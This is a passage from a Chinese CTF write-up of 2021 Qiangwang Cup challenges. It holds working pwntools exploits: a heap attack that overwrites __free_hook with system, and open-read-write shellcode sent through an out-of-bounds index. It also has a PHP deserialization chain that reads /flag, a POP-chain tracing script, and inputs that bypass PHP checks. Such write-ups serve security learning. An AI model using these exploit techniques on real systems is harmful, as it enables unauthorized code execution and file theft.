class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0xfb0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    leak_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena_offset<span class="token operator">=</span><span class="token number">0x1ebb80</span>    libc_base<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    success<span class="token punctuation">(</span><span class="token string">'libc:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x700</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment">#sh=process("./baby_diary")</span>        sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'8.140.114.72'</span><span class="token punctuation">,</span> <span class="token number">1399</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="强网先锋-orw-SOLVED-NN"><a href="#强网先锋-orw-SOLVED-NN" class="headerlink" title="[强网先锋]orw | SOLVED | NN"></a>[强网先锋]orw | SOLVED | NN</h2><p>对elf文件ida打开后分析可知存在下标越界和输入无限制漏洞。</p><p>指针数组的下标v1没有检查</p><p>直接回车，就能无限输入，摆脱大小限制。</p><p>直接利用下标越界，申请一个chunk分配给-25的位置，在输入shellcode实现orw，最后触发。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./orw')</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.131.68'</span><span class="token punctuation">,</span><span class="token number">12354</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./orw'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    shellcode<span class="token operator">=</span><span class="token triple-quoted-string string">'''    xor rax, rax    xor rdi, rdi    xor rsi, rsi    xor rdx, rdx    mov rax, 2    mov rdi, 0x67616c662f2e    push rdi    mov rdi, rsp    syscall    mov rdx, 0x100    mov rsi, rdi    mov rdi, rax    mov rax, 0    syscall    mov rdi, 1    mov rax, 1    syscall'''</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-25'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h1><h2 id="pop-mater-SOLVED-Hn13"><a href="#pop-mater-SOLVED-Hn13" class="headerlink" title="pop_mater | SOLVED | Hn13"></a>pop_mater | SOLVED | Hn13</h2><p>直接写脚本回溯POP链：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getmVar</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    pos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>method <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> i<span class="token punctuation">[</span>pos <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">:</span>pos <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getmMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    mflag <span class="token operator">=</span> <span class="token number">0</span>    mtmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> method <span class="token keyword">in</span> i<span class="token punctuation">:</span>            <span class="token triple-quoted-string string">'''if "public function " in i:                print("get defination:" )                print(i)                break'''</span>            <span class="token keyword">if</span> <span class="token string">"->"</span> <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">"("</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get invocation in line "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mflag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                mVar <span class="token operator">=</span> getmVar<span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span>                tmflag <span class="token operator">=</span> mflag                <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                    <span class="token triple-quoted-string string">'''if mVar + " = " + mVar in mtmp:                        s = ""                        ifexp = lines[tmflag]                        ifexpnum = re.findall("[(](.*?)[)]", ifexp)                        s = s.join(ifexpnum)                        if eval(s):                            print("var has been polluted by method 's ifexp")                            print(ifexp)                            print("----------------------")                            return'''</span>                    <span class="token keyword">if</span> mVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    mtmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tmflag<span class="token punctuation">]</span>                    tmflag <span class="token operator">-=</span> <span class="token number">1</span>                mpos <span class="token operator">=</span> mtmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>                mMethod <span class="token operator">=</span> mtmp<span class="token punctuation">[</span>mpos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span>mpos <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"method's method is "</span><span class="token operator">+</span>mMethod<span class="token punctuation">)</span>                <span class="token keyword">if</span> mMethod <span class="token operator">!=</span> <span class="token string">"U710q7"</span><span class="token punctuation">:</span>                    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> mMethod<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get!!!!!!!!!"</span><span class="token punctuation">)</span>                    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        mflag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">geteMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> tflag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        <span class="token comment"># 查找是否有直接赋值污染变量</span>        <span class="token keyword">if</span> eVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 查找是否有if语句后污染变量</span>        <span class="token triple-quoted-string string">'''if eVar+" = "+eVar+"." in tmp:            s = ""            ifexp = lines[tflag]            ifexpnum = re.findall("[(](.*?)[)]", ifexp)            s = s.join(ifexpnum)            if eval(s):                print("var has been polluted by ifexp")                print("----------------------")                return'''</span>        tmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tflag<span class="token punctuation">]</span>        tflag <span class="token operator">-=</span> <span class="token number">1</span>    mpos <span class="token operator">=</span> tmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>    method <span class="token operator">=</span> tmp<span class="token punctuation">[</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eval's method is "</span> <span class="token operator">+</span> method<span class="token punctuation">)</span>    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No FOUND"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geteVar</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    epos <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">[</span>epos <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">:</span>epos <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">geteval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-------------------------------"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get eval in line"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", total:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>                eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eVar is "</span> <span class="token operator">+</span> eVar<span class="token punctuation">)</span>                geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>                num <span class="token operator">+=</span> <span class="token number">1</span>            flag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>            epos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>            eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>            <span class="token keyword">break</span>        flag<span class="token operator">+=</span><span class="token number">1</span>geteval<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag{42a17bce-75b3-4e4e-a073-e5ec1bb4a218}</p><h2 id="赌徒-done-Err0r"><a href="#赌徒-done-Err0r" class="headerlink" title="赌徒 | done | Err0r"></a>赌徒 | done | Err0r</h2><p>扫目录发现<code>www.zip</code></p><p>发现是反序列化，exp：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'ok'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hi"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"give you flag : "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接读<code>/flag</code></p><p>解码得flag</p><img src="/article/2021qwb/image-20210613212339286-4170472.png" class="" title="image-20210613212339286" loading="lazy"><h2 id="寻宝-SOLVED-Err0r"><a href="#寻宝-SOLVED-Err0r" class="headerlink" title="寻宝 | SOLVED | Err0r"></a>寻宝 | SOLVED | Err0r</h2><h2 id="信息一"><a href="#信息一" class="headerlink" title="信息一"></a>信息一</h2><p>绕就完事，要求能过<code>is_numeric</code>函数，利用变量覆盖赋值</p><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p><code>$num1 &gt; 1024</code></p><p>直接<code>1025a</code>即可</p><h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p><code>isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000</code></p><p>科学计数法绕过<code>9e9</code></p><h3 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h3><p><code>isset($num3) &amp;&amp; &#39;4bf21cd&#39; === substr(md5($num3),0,7)</code></p><p>爆md5<code>61823470</code></p><h3 id="第四层"><a href="#第四层" class="headerlink" title="第四层"></a>第四层</h3><p><code>!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4)</code></p><p>直接<code>aaaaaaa</code></p><h3 id="第五层"><a href="#第五层" class="headerlink" title="第五层"></a>第五层</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"第五层"</span><span class="token punctuation">;</span>                                    <span class="token keyword">include</span> <span class="token string single-quoted-string">'KeY1lhv.php'</span><span class="token punctuation">;</span>                                    <span class="token keyword">echo</span> <span class="token variable">$KEY1</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span></code></pre><p>随便输个<code>a</code>过了…</p><p>拿到KEY1<code>KEY1&#123;e1e1d3d40573127e9ee0480caf1283d6&#125;</code></p><h2 id="信息二"><a href="#信息二" class="headerlink" title="信息二"></a>信息二</h2><p>下载发现一大堆docx文档，估计在文档里找KEY2，写脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""# -*- coding: utf-8 -*-@File: findkey2.py@Author: gyy@Time: 6月 13, 2021"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">show_files</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 首先遍历当前目录所有文件及文件夹</span>    file_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># 准备循环判断每个元素是否是文件夹还是文件，是文件的话，把名称传入list，是文件夹的话，递归</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        <span class="token comment"># 利用os.path.join()方法取得路径全名，并存入cur_path变量，否则每次只能遍历一层目录</span>        cur_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token comment"># 判断是否是文件夹</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            show_files<span class="token punctuation">(</span>cur_path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">".doc"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            all_files<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cur_path<span 